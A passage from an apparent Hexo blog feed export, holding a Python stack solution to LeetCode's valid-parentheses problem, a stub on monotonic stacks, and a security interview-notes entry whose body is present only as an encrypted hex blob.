<h2 id="1-辅助栈"><a href="#1-辅助栈" class="headerlink" title="1. 辅助栈"></a>1. 辅助栈</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：s = &quot;()&quot;</span></span><br><span class="line"><span class="comment"># 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入：s = &quot;(]&quot;</span></span><br><span class="line"><span class="comment"># 输出：false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">## ([&#123;&#125;()])</span></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        hashmap = &#123;<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> hashmap: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c != hashmap[stack.pop()]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="2-单调栈"><a href="#2-单调栈" class="headerlink" title="2. 单调栈"></a>2. 单调栈</h2><p>单调栈是用来解决“<strong>下一个更大</strong>”类型的题目。</p>
<p>一个数组，要求你找到每个元素对应的下一个更大的元素。</p>
<p>[To do]</p>
]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>安全八股</title>
    <url>/2024/03/25/%E5%AE%89%E5%85%A8%E5%85%AB%E8%82%A1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fea5877cf967d7a48e2fe2870dd29b4ea39c86d90eff0659e30b898b43ef1a1e">79daf73ab7e12bc9fcec37b9652516d3d171b9755653ec0ceb2f080eb91817090ac4f578d9f5227470746746e49a5dc4316c3e4475f9d2c68d66e93e8ae2f770f654c7f7e0fffc1383b1a19c62987ba42097dd2cc987aa7f6349339643f453236cdc381dfef9d988aff05a025aaf81d73ea8c205cfa7be82de4a23bdbabcf347450370297ba7a099383b3e84a528b6b471d3a26ed1fb83258f92ddd97561865803a156957c475788da7823a1c77809fedda33cfb49f8c86f9fae888a54c6afd9f80345be91ff894c7ebbb038dffc07f3206bd566999c7c23614c016e352bc1fa857100e1eaf26b6b1e457d7b3b9d23149f285823c090c6950db0d68621ae43a42a94dc4bc4997b4fb2d62886700f6df4f6819b94fc495201434dda7d6cfc332822fa04655a1666d297db2fff605fce2cb16ae7c64b7959c2f47a0a5f8cfcdd06266980b6752212ea42a683ada7cc7ab4b07d05cd591ea5d3542ee1119cc48ca7b0170749e8f49a028d71db106fc8a2677a4ff6f724d0d0187d7bb8c5e4be26ea2993fe0b6e51611eb91ee793fb66295ad9b48de1c4ddb68b5f55d830d5641dc8e79e581280702fa68ea14caa56bb29eeb610edb88438454854c624d034c94521147e619ce83456312ad1a1f3e3b133dd17b61fa11c0dbd8681915b5382d09b606f34ffce0e670bc1294a46f3b09108f3e0b0759f2c0bde395894c73fba0c4b88e80cefa07b89e42d98fb834268e635dd4682cc5ef740073ff0b527039f2333450274ba3fffe064b5f002a4f1c0682f1dcb55f459a3824d8dbecd75d4e6fdeb702d9ea3da205be80bb71a2ff1e9534965694dfaa15f72652d89e4851bafc819d8ac4048aff8c801727131d58c9e717c569663b10ed847307abe265ff551f0f4fdba87301693de69a2996f15914dde8a520ba27453860edfd59b5934fee85e1559f402c3b3cbc4066f50e007696131668b2e27eeb6a167e4cd594a6e4efa90b49f8a35507c1cf325b2007606e707e78ec3fe12425d3c21b56a487e6f69590d6da24fe4952295f87bc779a5b7a02dd222dbd095931714bdcecc34d21ed7214df5786738c04ab2ad88e623eea7609531e3180f785f94986c670f9baf790c46e5697b5a6bfae7de33e10fd1dc2a7b2e30bd3e3351ca2e01d7a283f4ac3bf3ffaa8fb26e0e8d50620c5d33e42719aa64bec2af50f288a007eaf52f64ad5de34e87ac332e92ecc26d3173f2326af8a133378d2bcf597903abf1ae5db564152efb11fa34c08e9dfdab4b593ba4feb8743fc516aa23b60f6a3f2514a09092b3ca18ca2b2480e4ca02fd7167a9085288093d94ca463fac6f90a30d75a9a361abd631e6ef08e5231003cc353234461f53de4d5dee7e40a407562decf33a75728965699451df122e23c299ea742e12f74762e54d35e115dd17f80bed70bf5a4a178cde30b39146724f598de60781216c698d037815466067b4e089b780fb9ea9a6ca03452ebe8fba548dc7e18c64655054567aa54cfb70f017b3c9aeeeb772b726a97d340d214a6e37cc18ecbab5272f8380df6fa6c65de90a3c74e716a009d29c19153c190e60769f71ec7e7ba15b5f259f3701dcf07f432f107c698b3afe803e3f624414fa3642288f0276fbfd07b749fba47689fcc35af1d254696d8f79d57393abf0973f3fe2d7bddd35ee941931aef288e8949339226a36da1e94bfa6aa82ae9ad78efcb51141b075a4402344ff4b97fed4540937ce295aedf1c4caafc4f1d88cc4c2c910bf8f68e5b3dd49d553e20d10e035b68085d609428e69297f9862f785e2bfd1ddc8dffe3f98f69aaf4ed6c65e3caa452fe9efba468219c923434a4c90b4778336c52eb40789a61aefd6eb99f544e225969e6d4c71588874fc6a41fb0bc0d4886652877a0a93fc00438da6238780c9fdf371da24a2a84cd153154621fd3295cde32cd0253309cff524fdcb603e9df7150bf6385e886b60e9693434efc5e9200ebb1dc226941a06ea69631b2fa7c234e85320ab4067fb3641dd3fde7dc572681c1a5c320d2beabfe43a048e574795a2f2e11483f2f70f7eb8c251b27de80cedbf4acf8aaaceebf0d2e30190602980e11ed1b0fe1274b36a6c7550c75532ae368a6c2fec33a9f1a198a77e9002f619c0ff27053c41b2796ac59d9a20a473df454531900784be3503016d1a4a41d98da3deeac9a6b7b1bf1fa2a0a363d10cf077a79c3a8d602632eb517be96260c69f00d97a05dba1831af6f3c6c115a574bfa431a83a136bcc5cb2bd132f96c9eb6139bd2016265e9f1361d6b086fef57ae5e615fdd8e155a15eeba36c16f8fb9ebd2d3febbe3c555c7dba7965f1d92b1e40c24e2b56d3ae5b6f676db79d7ed8adf95247b6187452760ace25828dc1e5534758c2b8c174d83bfb6a2b2beca729807ca050ba7bdbbd3e8a2881a0459ae16055c76bf6b17bf05e22be18fbd40a6bd2e1475d593d7a077a3f25bafe37e31c7cf601559b0e0c8797f3a2cb4eff1100c0ebab33f1b19675d1857cc3d2eefaaae27bbf9495eb1f5ea895b72891bf114e0bb90619e52f0aaf519faae012f64d0e0c368041621f7d84f399188f707863e05c514401a8d9fdf03e5076c872054262cb696ffc1bcbb19ffd58e5bc81bd05fba023497b8526487f9dbb86eb659f9f93ae0d1add8a2a44a6dcfd1cf35c1ae570c2b10f6afa455ffdb8ba84817325fc7b727d90435c11d14733fb269eeb0f97bc8ffcfd0acd0ed16a7a0e3e3f89acae980829c5e7910326e3b0c9e6ba0272f239192958127cd1b1b9f0d9b4538bb1e7c9e6f61f7ddba3fe7023d5d31e0f284fc784339dbef8ff58e250ef7d8ae5cd694d17d8cf5f04cb39253dab674a5881b8fa0c71fbc919742036b6d5c63957b279c01a70b122afaca6ee98bbb2ef25cc66bd72acfef31b0654c1fc343e256ebf37f20c3eb61841a09f7a7ac8fe1aea41f6f4fe1b45590e671f311a06a63a7c02a12a10d0a6ead744da2d5d904eac790f4fc1ae8461fec72d03fd5d8111fc324afc0d70abb3628ab7a48fc10e135f9e5969cad4b9dbde604c8b8d5f3d275bc5baf5334784e149c6935f1de9ac1efbbcfd5a2cfb4713f3355a8cdd558d03b074fcd107337eb7bacb94a808e9c9478909bc3e6ec87c6f68a110164a67fe78cc0e52f9dc875a44d4ad889643d8c8a7ab2464a335fa59260c89dd83a3836fdc917dd82d82b9dd7f09a8fba96d35266a8d28f3d52155071cc9580441bef03276d7ad4ba95644cea6f797a0131abcf12c1b1e12a7f75753702dec36c7c3f6fec8d6248dd9d4b1690b107e37e0ab5944ab91e13cfac7a6278019622c5e2fc6c69f5f2bb48af3d093c1222e6b451f2daf5498a189da10a46a23b223eb46ef0571c831f3b099107ee3a9cfa25935943e042fa8060ceb32f8ef0736cb0d797472412487af4d77e5600240ed24b83f4ee15e73205d3898a4d7b2a50e6f6ebaf4cb4760d50e74681bd8f8552d76f0394bb634a56166907698376ef383cc867fdf1bf98b1c528d627886189f8542bd183c1ca73aa33490340e24ba5f22fc8235cc95645b4ccbea6decd9ee4cfa1a2ce4bf26335e06131826bb842ad5abb2755d555376a6cf34bb03e07bc7aef06c9c4c87589ac10385903a3f0756b1d8f9a179c35d10f546d0d81d333541126499ab5f6eb0375990a4078bffdd7a33e73147483788f6ec7b2a97883782b4363d89144f271489cb802ce3b463765e01d23daa0311efba055cac5a3fdb9ad3ee329c222206ad4af08efcadffae1b60d652a65217146643d9ad5c236cbe50dc60faa29419100ac1964ce89ce567dc9cc11044530b5f96fcd1a96e45ab05888a80a9baa481ed772857bb0aa1e660339072dd45b25cf81c349a262af8bb9b9833142f508e1a9abcdb5ddc3ca8458406adf871dc98aad52fed703ae9c97b0e17a82713971d4b4cf7532ffbfd65a37e8af7a75fec19689584d0ea82da24be924d1c1e7f432f89ec4403febe349b07a744a07fe2d89a68c9edd54940c5f4734639b34837e3667b97124f5868e39c045cb8a572f4287cf8dc44a0ef7b1e25517c3a7d923ca09e725fd499b40108da6a4d9f093f8b989330d993da487ac86c45e6af8fb41884889f24aac91b224d6cfd6660ebe08eb6409952c77f23f2ab2d0ad6669865e487d370736e40893f26f03250b1265d3e818df4e0d0c7473cd32bc26448ecbb5f163ac7aab6f7e9d491aa02b9e9d66944b9d3419c171c7c1fa497c935f101a52cb3c9141c0765df9970f87b9e049f6d2101cef4a2d81fe15328b3154b11ac1796c5afc851a539892d8fad287942f946396c91b609f2946bc05462bc51b1ca9894abe6cefc143fe6a87e901164ca870c4d2dd098e51466bb59b0a3130f35151534d6e3db77a37128d2c038cb901b963677fc3f2e3ae367c0500103e478816915804e8b0a20403513b2bae52b0b89da6c82758d75fe1905d4a0b7425367b419854da81f9643d763d0ae9fe7842f380b8ffa5681fc21c68aea2d38e012d6ace336f028d6ae03d60acaa35daaf925cb8fd1818f6c710053a9b647ce66c6461911941fb0a6f2d51cf4819aa3d12b6abd7f905bb994130b81785988bf1da233202e27aa4a934fa660f82ccd9b1132730035fa2d67d356a407f1362ef9aeb3f7a76c34d3caa8c2f759699a228bedcb2358b962efb2c236359834344e3b61cd82d4100894af9c29b129a59cdf2f1d19a8938d248f533ac918c84dc97596e374945cb6a8ef7ed3e10b6a4be2dbca6bfc8a583b01fb543899b7d049409bc2c066ab5a75c6d2c301c66da5840bc778eaf906351ccbf023141f0aec6f8dd7e74f763d8a61edec10c60153ec6b278b6da47467665773aa0f8073091fd2e1b1ceb05c56bb2dbcd0d4621ce07d103ca025e716a9f469f49213d30e252ebdd014a40cbe21f17ee7eec7fe75f955e420e1a3c05e3e27a9ed9eba33928e69ebb93d57114f2fb1813c1ce28b102c8b29017c203b8820fb2cc86fc2eb094af907301097f19a22c042e06daa3d50a9f024e340426f099d814c8287a52baffcadea82e4c88c698ad5d9ccf0896a2a795b60433580fc7a8b9af584ae0eb2ace3c555bc216a3b6fb04e6ab1303a9142726b1c0d774c43bce71eb51deb0b59c0d89830c3115118126c38b93b50ff485a2724aa8c1675a58fe040a15537a36da67083cadc4e06228d0bc1d4364adbf6f1aed54583bdcc73d57fa2933c95acaa390d82899e7fae8a954cf3f9a8c9c376bdf79083211753925cb06dfe718423e0161a79dbaa94d0d3e3854946e4205e8a566af7cff415b9a5267050a2bc9941e91a5f54c7075e52dfd68acaf6fe0d5bc4afbfd455af3b1d78187fce7ab6381e65a7ee01fa567a6d44c15c9b798bbb1e6eb12bf6d21753534dd711ef1f1cb26d83505393ccecfd88d06224400f1b5c812fc9c224e7e6efa010dc2ea357b1c2aed3bd06199801d74a2f9decec95e094f62347dee00856204b92f9e3829caafba14c15ee877b31f1bfd1abfde1906dbd9115c5a718687a2b301bd78e5eaea75759a38ac0fafdf14619a5892b5b1a88a7a11320d8b090dec0d50153765a3c34cc444d480b1472c52179136c6719bfd0eb861835089206b76991b7526435947685ccbee7d7c346b18ba60e3ead28498e2aef63d05e38556ab3cbe60d18cfcc38c4d4097670c6f6b089e190c7a23d63dd4c01652c6aa268c11b657373add708b5054eb72276151ed124b71e754f276b8c8e0101c4929cafcaf9566c8a1053d3d988ff5e7419e79acdd68193eb0df5d2d11de941807e2fd38f8282ab756cb0bf3b300e99b894632990363ed31e2a476cd288e67e75fc2e790b3be4557c925d5fc5f64bc9e427feddd9727a9859e912f57ea8db9cdb6dde501eaa82fc7627540614c9ef9ff00d4c11fd9467e00eee66742c72dab16de65f74494c706b7e8b361c47163e22e5e1dd366c9f1a2a73a7754a8b5d1d4752a831670ad385a01f8b66f45721739306be424c00cade282ca3819f38dc25ac0756fb05c1b04058510f5897a1accdeb6466ec34e029b7018e2af785626c46225b347fd173049651c5d799dbff5c2a523e7c5a3405aee1f02af96538fa7adbc38c48a3b3e6369f879b8a961b979823f89d9d140aba04d5f41ed041cb53fcc08f5b4be7ceb60d41d2a6621cd066a918d325b50437f6b7755a855df14283e6ec49827e43dddd8fce9494ff4c36f9502bab6a324077b4bfd160f85e133c077c7da536fc3922215428defdf65ebf776f42329df6e1046b245bd5a3fc169b3e467ee88557dd150182b967271e8fba928659d73f2946ad21a7d252a7a2231e16fc8817ca544f7d9d40d99dda472065ac729d4a51378e9e701876c86acc1331b9dc5c6af6264d353e352dcb8f2a75efc722bdb28797dfb93ff01fd6c023b48daf573bf38b8974197b7f1bad6f9da5a9b786f69209eeb04731d81524683ea81164bd08338d2e4c9a4ff717d95a5ab3026c49ebee850d75dc85aaccf9c480db987c27706f95b3998c4c5fdf3d6817a8cd6d8d1697e13296d1662de679fbb64542cc71fbe2f2d57bda031a387cd098a883840866518bf2a42e1296326f85f1afcea16b13132ec304c64bebe761bd7108455f7413e36711b91f9241e4d812edae631fb37244e67efb76e00ef116a8328e31169e2e924c0eedc6d39d5ff9895ca418dc2486932bb7a51c64332d315c2d6b227ec2108ed02264b6d1644e0416e36d7a8c8a9dba046727ed7b20a9233b67b5950906286bb38d49596cb5a8529021f0fea6631b78f64948c56375bc65f2eaef88eace1d670d3d2562b0a0309f2a5fb3b1ed1126956c296a5db237a1aa193027982477aeafa372e5389ca075def223efc6822bf317441fa9e34e7bf42fb30be4e29bcc69a8e394d6ac553636f35e67a20b250eda7ebbb7a21b768e8a1e37399e6621ecb600ad2c7955798a047685aebfd8e0a2c2b222c21e9730b58899a257c2172c7a81a95e071a690f424a0b6508428e9205fd8cc2cfe5ce057aa4f3446d516028048083ee96076c3cc7e12b256e1e4f43a297790dd00b4e471f25a5d121515d8a15652e7422ed6d8f49a3ef4f7dff0491014dd3a59377f8049c0207f5fb7610f3abf6eb1117acf2209fb6435d446b2990fd18b7336ef48dc67e06d2c851a30c3ab87b17d3a02ba3be3d6ff6dd983b6a708c18f9adc5cb4a491d60c427507f93e23c0a2ce3a679d448c3dba5c1ac34a835354ec569e84f49478abd72a3c2e414d1b6eb3ffcbe125075dc398c0d636f358715ccdb67b00daa1a0a5b437b990fc915eb680bce68a760c2d36781eae75bc6cfb7675740358417490d61c152234e0245b5faf17bd9954507dbe7b2902cae96312abd507be40edb2bf9f2f0d4b86bb538c7646e67ea11c7959f066b73ba0e2040ce17c015fae738b34dad8924eb7135a021eaa3d82b563638ed8713d0e144b6a86c71ea74fea4dc2a3996105540bb9f5f9feb0eeae5129fa4a90f83aa91d3b96e3977265a99e87526ee9efdf7dab0ad3ccb399d9006a770de2f1ea974ff18c61a23e171ba8d7644e5db973708c4b853498ade2ceedcc351705246fe61aea3839c116d7aff5cbfd5aca19fccdb061380754b4734a4b64f8e99df389b62ff0ba32a837029f407dfd6ac70fbeec383f70458afc4533f271feff5d246d955daf8964a97deeee8a1be1169265e32bc0bf6001b96e91b1e4c50614cab77b222a10edf4c17f4786b0355df88256c6f97831584e399a04dfc7b163db5b449feb3384992d5e278f90e22caf6c48d028824a3c9b4006884846de95844e0b51dc6cf0fe3ff424517553603f5be95dc1f8c3b51de6495f559753fea2bbfe7666c7065533433ed9cac9a4c57f0ab1277f010a3b67b5d07b3a6da080fe90f25e8b472f83f92cdc7392982c3a294a06941d2aa116c11edacb1c93e0aae9d30a2e100652a20a1cfd6fc492104e3273f0bd1759df8a4db5a75cddf37411bfced80422c3589bb801680ca8a832243f3dd35a3e4389f101209d50c50d8dff8bc8d94eda35ee31cb91be14e80be8849a81dec570b9f782f34d7bfe987f76d2fd5d74023024c03114d1db3e58b203f987d4fd2417494f0c1ac901e7b95ad33edfe804793cfe98bf06db499a5ab97d063900535aaaf0c63a14ac6fb6b01dea9aec0df9e59216ae126fb0711c92c8c17d1d7eae354378f7de7b72be01f28738e28635a70f43f27561be4ff2af2b94211641c59b29dbe1f7a7c78046fff051e5413981d23f46cabaed5c3f817a8974bf25b91aa0f99dbbc27e3213dfe4c0d87a0f0b98946968ee077d6bfaa072cca78d8a14611c890e9c8e846b926fe390f7f58d9971dbed4fc46b3d41cea2e27a9d6d7eb51bab56a6aafa11f186b02e9b73542323a9cd06a6dfe6c69856ea36e04d3818c68cc8521a2c1d94e965e1d9b771e966bd6f0c353f0c31e375f04ca27eefd7af7e3d3ee82ac8cd395ba66eb0aa68e738a990ad7782f57d598b586caa4c3bd0cae3f282586cdb38e5abae56f01b5f7c864e9d5b09fe6788a9dfac8d3fe47d4fa8a0d4ffdb7db03329786d9534fe972ff81cb61f585a88e5fe35f36545d37ed1e2d9a8d3cb896bc43b68a9af9b22f37e722bf03631b000b9683dd3cf843cb3c60c1c7e5e270895af38528f42bbc275e57cb6de1f89269301f0548bc2d2a35e13dfc4d17340a8ce00aff4cb2b6451291d297af0924aea6eb3d45f15df5d097d3906d7636e1261dd7feb79f5835aa7a146203851b127f1a95ff57f06a959d87bfd6bf8245c03fc49da34bb244a04c4f2798ddec68658b3b625e26fdb9f6e6dade8d23bcf57701350dfe7d7f9831e639e9dd2ae22d3ae692fcb07009cf37266cc0351fdc08c97d659c0c7f0bbca54ecedd25884f095ba2bf1781d895a95949727ecc75d609db3d746f6e2113b03f9d5db4a30dcc59c2080955c544875e00b952e193910aa7595279824d660a5cc2136056b1d02896df1f5e813adbb2011dff60354a86759d3ea45ee010fadbadd7bb297e21052ce3944cf183b735d97b9fe0ad9bd93029e41870cbf7562330a930ddbed7a096c868627c3a34105a047ec33f4e3c3c8733243f02f452fe89b117356fbe0e47f72d8d44922578ae36e3b2a016dd30c76b59abff12f746c02be8eeaaccb51a9b5a0fc80635e1d7ff2090dbceaf94fe9a7f7be5af8b921c7a66dc6f773fc745e47bb890be1ff1cfd6a7e7029eb00500e6cce2c91742806900d80db9f4595fdedd8fde5a498dbfafc9c16c05df97d998eff7f6d2a8c00875988c52dbaa58f6c18d3a810253a5f76820a1c8f669110ab1cbb0eb45e8db7c9fb657f1e2b729d32d488861ba1d01251cbc07414b6c9e69bf3fa5e4eebf2ce554dbaec72d1e901238e2c31c5caa54a76696f859d14b5113d2774fb782e3b26fdac36f874e46dc3df0876154d1c2254e9d7dede49f561159583a893a7a4556466792c55d07a71318a60045ecbf081d7ffe80712e45984707d87e68a72b0d63b1f88e608a35eaddfa360542cf0460fe9cb761acde1837ce7c9e0e40e4ee4abf5cb0a690130d31110fabc1b9599fd7fa6ffaae040bdc5ed534edca83bb3a3fdec9e50c171a1e1d6bcd1d22bc51d199f915f36ac3abedc42faa174f7da39726a939a4d3073e18b742a67c7d5f8f1b05aafefc9dbf9b68632de3c5c9dc529a2124d733dea48247644efc2e63bad29c86381fa27ad6a3a2628f42367c5a436b966248bf53e98fdcdae10f4677e8da69f13d79c5d62abed0a36979410dcf7c9f4f98e49adc72e96e26e5b07329acc8b11fd0b8c805038b0e842c187f3ea60eeb2abd1f94fc9da0bc70979b5d47544937c1b61b0cc652676aeacaf6e52bc8bf1fada32a1adc7f485c2d013690168309d9ce5a694a5776c97519720d794995f721ef3d818b30962fb36d40d5b4893ada347daac5b3c03308b4c21d01b1fba6d4fa28aae9aca751702ab69dcfbc7d48d2c2868e89f636f3c72007c8442e2b907325a26795e9a15ca54183cffdad49bbf7de9432b218ce34a26847c32a07e98d9318eb5c1ef7b990a2d6a8aa1de9ef7d121d6e5cfe65470217a0d0b9633519b461648dd35fd67f35895b2c0f229519183830345a2ef54cb908d1863ed902dfe529aa3a4b7582f952de764f26ca9ee37bb5d3e8e821cd5855ce159bacfc52ec5d6a482e4333a55849e9dc3476734d76fcd5483f124e1c5648709f87393d802b2bd5e7ea60064ff7193bedd837ca3108ebe436b102751fceace66a7ae7e7871e1625308a1c324bf360b5a7e4e2e51b658f2d4158c905c1b751413d742d7f9c044fd27d4ddffc31482f5e355bd6a2ab9bf5317a3b848539994d68ecd23ed8c3698d7a86c864c2d4ffef614282ea5efeb8cce327bdcd74c0467ead59a643201f7ec3615a1d19f81ce009887ba4c920885d7440b0967579b48215f7abb8ee73891658fd59bd6d6fd44cb01f75821c435b3edfd25b9c0e6794b9b9d7f581bdbf422bed442a1a5295257407d1203cfbc30c6d4ed0c4692e378617b96a701f05a0bb0f650bee6418e4ec92a18109ce21455587cc8cfecff6944aeea214c8334c276242e877fadcc3c010601fa9180867620ae58745b24944b62ed962cc6c11896c01431ebd8304a6f4f3484a480224a89118033ddad4aee7664e6e93f0e1ebdae9726003866496ac26468642a8ce6eee82667ded96bf586bdafd2cf852d29c7d16f2d2207965908b18e5e489fc8ae45c90c5d33cf1df7f0ed53ed3cafb1f4787f2f50a6d9f539fe04d0c55f59d27a51dc2ea287b0e2149b650fb89887610ece464e9fae2d12d57ae41bbec7ee9d7415906ed95af3dfe15fc47c95bffb879e8c4114442510c29e680529cda6f571dd7c1a92c92bcf90a24800a7de8057f6cb8e69ab16bc600c199b1f3016f215ed67d0a587d91f43d729c02af2d9c8281ae9187b370ebef187124175199888f52a3c93ebadc3b736cde459249e86df7b5d553c5197c17a21c00740265a5f0f9f23624608c3970dd7d5e3fdc58f53e5dfd4305ee08fc6c687ffd0282a426cf7d7e0253ed2aedd3e0532c6a8ade07c3becc8458d1ed167753113aa74220f8307722ba90b5bfd64f377eb88edbd1dd96ac90d4e4feb4adee2f1c399340312a81ac2370dd3a99099d8057b256c1a1a1225ee61578fb00dfe1584311c3c5de7cca217d2ad9140c9432bdc89b000c042fa08a6b346fa409284eecbf35c02dbc6b57335b3f73191489620d2ad7e41c8de6a58ed234fc4589909014d1beb797090c28627470a5d7c6d3fe8b4890d5159be01b25b89e16a49f90dc638f3846544012e74d1bc175dba86936c4d89319e6908bb24b5021d85e5f153a6f9be2bed03f45a450ddcb99a2394efb81f22f5ac77bcbdfc49fb0984627999f5227663e3d13cf37da18bdeda79954b0556384937452c408fd8f51d80535389fa6657cdde87de54c932d5728f854c8fe6c6f15da526f8fdfa013dfdca5a2a128fbf99053d26d5a41bd6f26fb44234a59968bee1d51779deba7d2d2e40ef1027e852037ffc1e7b890cae4b2bf4dc6237cc9d6a953c1c31056c12c1370492d433b444f9c99f8803f726ac30d3f27f71aa6b5f64173c77971577d23a328c46de59c9c274a6254a265b9c1e1f8d5b3ee6b26749106b82890ee0dc4489bab83f8bef41fc03f8b2e8eae10da0b1adf28e9578c6c28d7f95e9b8ce5f7db2d16ca58e66396c831c06b2c4a6d98e6a3bf9671b6eac5dded42d8aae5f0ebe89dc12c7d3b3cdcae4d590724cc18def0fb49e0d261ecddb7bd82a2634030f60a147e9daf8780127b53d501a84a8ef2f2727932f1e630583fe49534dcfb461136fb45d392a54f8de0179455bd63ae33896ef84d98346dd39b6de79754305675e4c20fc4ef2fbe697d7ed76e5c9f95291f9d1d7258bac5576658977d99c8516cdc3aa5ba5cce1ac43c502db47f9a713d238979904b4baf761d0121430bc94c3f5e7b88285c608029d75ede972d69f7af1e032466317de7eb794c4826370386565b192f3190e459aa39d6fbd78400a0c8778578e28c2996bb7f27704c03c2cdecd4f49226171906db4a143cf65161d627d7a358dca0b2a25c2a3155e545a5a3e737bbffbf0ce4fec82331c979c3a65822b478b21d153ff722810bf3efc04c7539462aa8c27afdcf1b6a58b74eb0f85d7d99e4e4541e457a680661ad71dbbdc96737b3cec0ed28ae1f650963c0c215a2facb2f9167b37026be85f6965de6d5df94f2137004acb5ca87691a40de3f87410eef2e6b87e719948e59b0b66dc09ba9e47847d7d3bafde4a26c799c4928ab6e2d64eef8039ba921c589f82efacaf82069ca9c4cd4d6b6140f5b81ca485f671a9472a8d559a731a33389d40cf2dda7d52985ce34258d054d5fe78c96f1288a22cc376d7ff809fcbbf0da3c7fecdc7b559c7b4366ed883225dab9226600ea942c6399c14b7933ba1c0109c383831e34892d487a0ce26cca0a8cbb23d4875c9b26f9a97db851c4818746dbd5151fbf8da53c40e1cc37f0dfb1c1a71cf6215401943ed4b6b740f7c90de81b89a3c143a156ce19fbbf4a24a077f4399479383bc592f6de4db3b002600ca7ffd812a45e1cb27f5ffb793fb850dfac6e7ef04b4ee2564d779cb64aae35d52c1c8d67d75682dd20e92cf0fdf1f29dca5a332208985c6ef40da196c6bbeec69b1710f5d53441162029e6d93a1f1f15b0649e85d57a954ec28ca29b1833f578a8ef2b263e6891a5558e5fd0189ad049a2fc33e69d24d219b93ab877647806022b6f6a215512c4f882fd878592011481d9a1ae70bba75919b817398637ce0726b6faaca3e908a60a6bac87992faddb089d519b34f78b7956466f3e5a6615ce0ed94f11ee7f0eaec2429cb724d4d98a67a97e66b0a6def910f2cb79571179886d9628b6046fac2d9ddc1459fabf662c73099619d0eb8e70ab60fb590170913e2d2c895aebd32acd335cbf3b8871e00f85a452db7ad0afaa745729c7c815016f0679ab19ee043ef25b865d79df7ca847a26716ab541de4ba80a643889cde904f8da52371f16ac5a5af08a34c8b7b7f8d728b9f7917354ecc36685f21f73e4d05f92c398ebdabce53c206ffa0a0142110a46eee58f9e5d74b8d0927b5c640003105041bcc48416ef95a9c59e92b6f86e2d5137f6f710b50c9ae9ceb0b2a862fbe01024d15bf70bf371de62370708befac822fa1c51902161ca99bc4e786dbfd45e8050c94a027c62be54ad1dd82942f930456741329a31285e49724a0956732bd4894a61338616a723e9ea29d192a55025431ec688704a3fbb9925db1453bd37003a81e369a7434455eadb18912cd652a70cb9759d06db1db722cfd463250a16ee87f8f8f5e416ef8f64a8c38004964901a2d6face28a84e74cb3beb626ec5f07a009f2558529f75066bcc0f45e1e276029e410b2112fdd32411d688d10f4334e5d3a4256a110336519d29a99d89b49f7d2fda2a45f4ad74be890a334d5f1ed0782f0645e86cf43f3b9bae4e60be1fb5eadb232b4797e7d5502d45fce3ffebf9fc3f45c796fbe17b5d76b1a774836393755ce99fcaafd35679e53bce2a589b5c64d71236b41e23c740329a5fd38e8c1497bc53405b4159d9c0b64cf189bd36c0acf155415c69b56d10781ee5044298d06ba96b205f343c3636113b04e7f6a928e0ea71767471fc9bb3f77220b99c270ee8d3455677bbefcec622bdceda345f1602ad43027427611c50b4632dac18d0ef543102d97365adb60f7422116c275efe33af40942e5490c99f707ef0cdcfc3ab1ebd6d880d31976e0590a90efdf3b12cda19009f77a5452a16f382b5688a9d819be0a27d8e052f70b1e1ccd5786015885eaddcbd1c2e52fc4072b7fd52eb097af18ba78600e9462866c1e6e203a8e7b5ade443767a069ffea783eaa77bea2196db1dfd99c21ece23ccd7cf9af8db117f6b089a6462afc35f041941a51e7183c570c15576f2cfe0b635cd1abe4fcff3cd17b44ab4e6d0fc28a506bcfed3a9b4876628d15e94f851b352272280cafc1a527ed19fd58bedb13fb08a354eb20539e1232582055c4346a37fdda363c5af9ab8ff3515cc488d93738fd6a43e394f3c15a84eb7ae2cba2cfbea4754af08ccc4b25eb173432491a2957cc0b2eeadd9dbcf2a3d472b9254e0a68457cead61b0bb0ceb2a28914a38a63b57aad4f00968f7094d96bac54d6a46386cae6d9029098ead72bb0f3185b6c65d72045e2c8256e2a65c1b6e9d4cb2239d434473b50bf0914b68b800429e6b6e39a03a1bf295e1ea0c6fdfbeda03d3cc753b92f5dfba23e50e523459a59d6360aaf1cd3ae2e2f13552c4fd385811ab521854bd70bb1e7afc7e8f97d1bf6245adff868684b267657b6d5964feeaea244da9ba3d31ea0dfc4bf818229850ecb9ce512159f96aba5db5233ef79b6cf6fe614793f3448fd380e339f493e43c75ee40b2a345c4f1dd037dfa8a833443b8c6fa0dda21c1467ae23f50c23c4b8bca134e8940f38659a458da6a72d15f62b35f2b0b92c348c8b1891d5e43aa4e8b27ce88c7449167d8f4805f2c9e6c0be0b0acac6543a63525e3c0472848eb44719b9115204867d36e949183ef9896a9a8dc7d894d50155b6380e5f4d7e60a98a819b67cbf3131ae7c58e3245ccab6848f709394f64231e598fc0cc876835a8269dbff566ca1764150cf2d9d3df90c91227058cdf1c0a3e14a7ea6777abce45